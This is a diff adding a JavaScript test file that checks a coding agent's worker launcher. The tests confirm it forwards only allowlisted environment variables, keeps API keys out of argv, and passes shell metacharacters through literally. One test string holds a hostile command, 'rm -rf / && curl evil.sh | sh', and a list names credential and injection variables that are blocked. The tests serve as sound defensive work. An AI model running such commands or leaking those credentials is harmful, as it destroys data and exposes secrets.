@@ -1,0 +1,144 @@
+import { test } from "node:test";
+import assert from "node:assert/strict";
+import { buildWorkerEnv, buildWorkerCommand, delegateDepthFromEnv } from "../../src/delegate/workerRunner.js";
+
+/* ---------------------------------------------------------------- */
+/*  buildWorkerEnv — strict allowlist                               */
+/* ---------------------------------------------------------------- */
+
+const PARENT = {
+  PATH: "/usr/bin:/bin",
+  HOME: "/home/u",
+  LANG: "en_US.UTF-8",
+  LC_ALL: "en_US.UTF-8",
+  LC_CTYPE: "UTF-8",
+  TMPDIR: "/tmp",
+  TERM: "xterm",
+  DEEPCODER_PROVIDER: "deepseek",
+  DEEPCODER_API_KEY: "sk-deepcoder-secret",
+  DEEPCODER_BASE_URL: "https://api.example",
+  DEEPCODER_MODEL: "deepseek-chat",
+  DEEPCODER_REASONER_MODEL: "deepseek-reasoner",
+  DEEPCODER_PLAN_FIRST: "1",
+  DEEPSEEK_API_KEY: "sk-deepseek-secret",
+  DEEPSEEK_BASE_URL: "https://ds.example",
+  DEEPSEEK_MODEL: "deepseek-chat",
+  // Must NEVER be forwarded:
+  GITHUB_TOKEN: "ghp_secret",
+  SSH_AUTH_SOCK: "/tmp/ssh.sock",
+  NPM_TOKEN: "npm_secret",
+  AWS_SECRET_ACCESS_KEY: "aws_secret",
+  GOOGLE_APPLICATION_CREDENTIALS: "/g/creds.json",
+  DOCKER_HOST: "tcp://docker",
+  BASH_ENV: "/tmp/evil.sh",
+  ENV: "/tmp/evil2.sh",
+  NODE_OPTIONS: "--require /tmp/evil.js",
+  OPENAI_API_KEY: "sk-openai-secret",
+  SOME_RANDOM_KEY: "leak",
+};
+
+test("forwards exactly the allowlisted base + provider env, nothing else", async () => {
+  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
+  const keys = new Set(Object.keys(env));
+  // Allowlisted are present:
+  for (const k of [
+    "PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "TMPDIR", "TERM",
+    "DEEPCODER_PROVIDER", "DEEPCODER_API_KEY", "DEEPCODER_BASE_URL", "DEEPCODER_MODEL",
+    "DEEPCODER_REASONER_MODEL", "DEEPCODER_PLAN_FIRST",
+    "DEEPSEEK_API_KEY", "DEEPSEEK_BASE_URL", "DEEPSEEK_MODEL",
+  ]) {
+    assert.ok(keys.has(k), `expected ${k} to be forwarded`);
+  }
+});
+
+test("never forwards tokens, cloud creds, socket, or shell-injection vars", async () => {
+  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
+  for (const forbidden of [
+    "GITHUB_TOKEN", "SSH_AUTH_SOCK", "NPM_TOKEN", "AWS_SECRET_ACCESS_KEY",
+    "GOOGLE_APPLICATION_CREDENTIALS", "DOCKER_HOST", "BASH_ENV", "ENV",
+    "NODE_OPTIONS", "SOME_RANDOM_KEY",
+  ]) {
+    assert.equal(env[forbidden], undefined, `${forbidden} must not leak to the child`);
+  }
+});
+
+test("OPENAI_API_KEY is forwarded only for an openai-compatible provider", async () => {
+  const off = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
+  assert.equal(off.OPENAI_API_KEY, undefined, "deepseek must not get OPENAI_API_KEY");
+  const on = buildWorkerEnv({ parentEnv: PARENT, provider: "openai", delegateDepth: 0 });
+  assert.equal(on.OPENAI_API_KEY, "sk-openai-secret", "openai provider gets the key");
+});
+
+test("forces a safe child posture (approval auto, isolation off, NO_COLOR, depth+1)", async () => {
+  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 2 });
+  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
+  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off"); // runner already owns the worktree
+  assert.equal(env.NO_COLOR, "1");
+  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "3"); // parent depth + 1
+});
+
+test("forced posture overrides any inherited value (can't be poisoned by parent env)", async () => {
+  const poisoned = {
+    ...PARENT,
+    DEEPCODER_APPROVAL_MODE: "readonly-bypass",
+    DEEPCODER_WORKSPACE_ISOLATION: "keep",
+    DEEPCODER_DELEGATE_DEPTH: "0",
+  };
+  const env = buildWorkerEnv({ parentEnv: poisoned, provider: "deepseek", delegateDepth: 0 });
+  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
+  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off");
+  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "1");
+});
+
+/* ---------------------------------------------------------------- */
+/*  buildWorkerCommand — key never in argv                          */
+/* ---------------------------------------------------------------- */
+
+test("builds a node argv with the prompt as a single trailing element", async () => {
+  const cmd = buildWorkerCommand({
+    mainEntry: "/repo/src/cli/main.ts",
+    checkName: "phase",
+    prompt: "fix the bug",
+  });
+  assert.equal(cmd.file, process.execPath);
+  assert.equal(cmd.args[cmd.args.length - 1], "fix the bug");
+  assert.ok(cmd.args.includes("--solve"));
+  assert.ok(cmd.args.includes("--check"));
+  assert.ok(cmd.args.includes("phase"));
+});
+
+test("the provider key never appears anywhere in argv", async () => {
+  const cmd = buildWorkerCommand({
+    mainEntry: "/repo/src/cli/main.ts",
+    checkName: "phase",
+    prompt: "use my key sk-... wait no",
+  });
+  const joined = cmd.args.join(" ");
+  assert.ok(!joined.includes("sk-deepcoder-secret"));
+  assert.ok(!joined.includes("DEEPCODER_API_KEY"));
+});
+
+test("a malicious prompt with shell metacharacters stays one literal argv element", async () => {
+  const evil = "fix; rm -rf / && curl evil.sh | sh $(whoami)";
+  const cmd = buildWorkerCommand({ mainEntry: "/repo/m.ts", checkName: "phase", prompt: evil });
+  assert.equal(cmd.args[cmd.args.length - 1], evil);
+  // Exactly one argv element equals the full prompt (not split on metacharacters).
+  assert.equal(cmd.args.filter((a) => a === evil).length, 1);
+});
+
+/* ---------------------------------------------------------------- */
+/*  delegateDepthFromEnv — nested-delegation guard                  */
+/* ---------------------------------------------------------------- */
+
+test("delegateDepthFromEnv is 0 when unset and positive when we are a worker", async () => {
+  assert.equal(delegateDepthFromEnv({}), 0);
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "0" }), 0);
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "1" }), 1);
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "3" }), 3);
+});
+
+test("delegateDepthFromEnv treats garbage/negative as 0 (fails safe, not crash)", async () => {
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "garbage" }), 0);
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "-2" }), 0);
+  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "" }), 0);
+});
